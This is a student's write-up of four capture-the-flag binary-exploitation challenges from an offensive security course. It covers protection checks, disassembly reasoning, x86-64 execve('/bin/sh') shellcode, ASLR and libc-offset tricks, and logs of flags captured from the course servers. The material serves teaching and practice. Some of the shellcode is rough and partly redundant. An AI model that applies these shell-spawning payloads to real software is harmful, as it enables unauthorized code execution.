# CSGY 9223 Intro to Offensive Security
# Week 5 Challenges
# nam10102

## Challenge - Old School
```aiignore
Just write the exploit like in the good ol' days!

nc offsec-chalbroker.osiris.cyber.nyu.edu 1290
```
Inspecting old_school binary:
```aiignore
$ pwn checksec --file=old_school
[*] '/mnt/csgy9223_IntroOffSec/week_6/old_school'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX unknown - GNU_STACK missing
    PIE:        No PIE (0x400000)
    Stack:      Executable
    RWX:        Has RWX segments
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```
Running old_school:
```aiignore
$ ./old_school
My favorite string is at: 0x7ffecb67fcf0
Let's see what you can do with that info!
>
```
Useing readelf:

```aiignore
$ readelf -Ws old_school | grep just
    37: 0000000000402008     8 OBJECT  GLOBAL DEFAULT   17 just_a_string
```
Checking binja. Looks pretty straight forward. We'll need a solver to send in some shellcode. The binary provide us with the address of buf, which is where our input is stored and our shellcode will reside.

The symbol just_a_string contains the "/bin/sh" we need to pass in.

Lastly, we will need to spoof the return of main to point to our shell code.

First thing is to get the solver started. Next we'll get the syntax we need for our shell code and pass it in. I'll start small with something that prints out the address provided and the address of just_a_string.

```python
shellcode = asm(f"""
    mov rdx, 0x0
    mov rdi, [{string_address}]
    push rax
    push rdi
    mov rsi, rsp
    xor rdx, rdx
    mov rax, 0x3b
    syscall
""")
```

According to the stack representation in binja, buf sits at 0x38 bytes into the stack. The assembly is 0x17 byes long I will place 0x19, 0x0's followed by the address of buf to override the return for main.

shellcode, 0x19X0x0, address of buf

This would not work because the assembler would not accept the address given for buf in the lea operation.

What I ended up doing was setting rsi to 0 using 'lea rsi, [0x0]'. This allowed the system call to open a shell.

```aiignore
shell_code = f'''
mov rdx, 0x0
lea rdi, [{hex(string_address)}]
lea rsi, [0x0]
mov rax, rdi
mov rax, 0x3b
syscall
'''
```

```aiignore
[DEBUG] Sent 0xd bytes:
    b'cat flag.txt\n'
[DEBUG] Received 0x52 bytes:
    b'flag{th4t_buff3r_w4s_th3_p3rf3ct_pl4c3_t0_wr1t3_y0ur_sh3llc0de!_d3d93cad2f2bed9c}\n'
flag{th4t_buff3r_w4s_th3_p3rf3ct_pl4c3_t0_wr1t3_y0ur_sh3llc0de!_d3d93cad2f2bed9c}
```

## Challenge - No Leaks
```aiignore
I have all my shields up this time! Can you defeat ASLR?

nc offsec-chalbroker.osiris.cyber.nyu.edu 1293
```

```aiignore
 pwn checksec --file=no_leaks
[*] '/mnt/csgy9223_IntroOffSec/week_6/no_leaks'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        PIE enabled
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```
Full Relo, with PIE.

Running the binary:
```aiignore
./no_leaks
What can you do this time?
leak
Segmentation fault
```
I suspect it's looking for an address. Going to binja.

Main creates a chunk of memory for us using mmap(). It's 80 bytes long (0x50) and the read for the user input allows for up to 80 bytes. My guess is that we need to generate some shellcode, and run it by overwriting the return address of main. Let's see if there are any strings to help us. No strings that I can see with /bin/sh. We may have to push it into memory somewhere.

Check actually treats the buffer as a function with it's return buf(). I think we need to break ASLR for this one. First I'll try a position independent approach.

Shell code:
```aiignore
mov rax, 0x68732f6e69622f
push rax
mov rsi, rsp
mov rdx, 0x0
lea rdi, [rsp]
lea rsi, [0x0]
mov rax, rdi
mov rax, 0x3b
syscall
```

That worked!
```aiignore
 ls
[DEBUG] Sent 0x3 bytes:
    b'ls\n'
[DEBUG] Received 0x12 bytes:
    b'flag.txt\n'
    b'no_leaks\n'
flag.txt
no_leaks
$ cat flag.txt
[DEBUG] Sent 0xd bytes:
    b'cat flag.txt\n'
[DEBUG] Received 0x38 bytes:
    b'flag{w3_c4n_st1ll_d3f34t_m0d3rn_c0d3!_853e98c9add95dbe}\n'
flag{w3_c4n_st1ll_d3f34t_m0d3rn_c0d3!_853e98c9add95dbe}
```

## Challenge - Assembly
```aiignore
No BOF needed this time. Just set the right values to get the flag!

nc offsec-chalbroker.osiris.cyber.nyu.edu 1294
```
```aiignore
pwn checksec --file=assembly
[*] '/mnt/csgy9223_IntroOffSec/week_6/assembly'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```
Parial RELRO, Stack canary and No PIE

Running the binary:
```aiignore
$ ./assembly
Set the right secrets to get the flag!

Segmentation fault
```
The segmentation fault is a hint. Binja time!

Looks like it runs buf as a function call. There is a call to validate that looks for consecutive bytes of 0x62, 0x69 and 0x6e (bin) or 0x73, 0x79 and 0x73 (sys). 
Well that puts a damper on syscall and /bin/sh. There is a function called check, that if secrets == 0x1badb002 && data_404098 == 0xdead10cc, then it prints the flag.

I think what I need to do is write the assembly to set those values. There is a symbol for "secrets":
```aiignore
readelf -Ws assembly | grep secrets
    18: 0000000000404090    16 OBJECT  GLOBAL DEFAULT   26 secrets
```
And data is 8 bytes after. Let's see if this works.

shell code:
```aiignore
shell_code = f'''
mov rax, 0x1badb002
mov [{hex(secrets)}], rax
mov rax, 0xdead10cc
mov [{hex(secrets)}+8], rax
mov eax, 0x0
mov rdx, {hex(check)}
call rdx
```
Got the flag:
```aiignore
Here's your flag, friend: flag{l0w_l3v3l_pr0gr4mm1ng_l1k3_4_pr0!_385a7d17fa48e363}
```

## Challenge - Back to Glibc
```aiignore
Do you remember how to get glibc addresses? Let's try it again!

nc offsec-chalbroker.osiris.cyber.nyu.edu 1292
```
```aiignore
$ pwn checksec --file=back_to_glibc
[*] '/mnt/csgy9223_IntroOffSec/week_6/back_to_glibc'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
(csgy9223py) nmaiorana@Nicks-Surface-6:~/csgy9223/csgy9223_IntroOffSec/week_6
```
Full RELRO and PIE. Running the binary:
```aiignore
Remember those libc addresses from Week 0?This time you can have this one: јU

Hint: where else can you find '/bin/sh'?
1
Here we go!
Segmentation fault
```
Looks like it leaks an address or something. Going to binja.
The main() function sets up some memory space using mmap().
They print out the address of printf(). That will allow us to get the base address and reference what we need.
This one checks for the word "bin" in the input. So looks like we'll have to reference a string with bin/sh.

What we send as input will be executed. Now to find a reference to bin/sh and build the shellcode. There is a '/bin/sh' at address: 0x001d8678 in libc.so.6 for the challenge provided lib and 0x1cb42f for my local copy.

I had to do 2 setups for this. Using binja, I had to look up the offset for the /bin/sh string from both my local copy and the one provided for the challenge. In my solver script I had to use one for local and one for the remote server.

```aiignore
Here we go!
$ ls
[DEBUG] Sent 0x3 bytes:
    b'ls\n'
[DEBUG] Received 0x17 bytes:
    b'back_to_glibc\n'
    b'flag.txt\n'
back_to_glibc
flag.txt
$ cat flag.txt
[DEBUG] Sent 0xd bytes:
    b'cat flag.txt\n'
[DEBUG] Received 0x3a bytes:
    b'flag{y0u_r3_gonna_be_us1ng_gl1bc_4_l0t!_e116054913869f5f}\n'
flag{y0u_r3_gonna_be_us1ng_gl1bc_4_l0t!_e116054913869f5f}
```


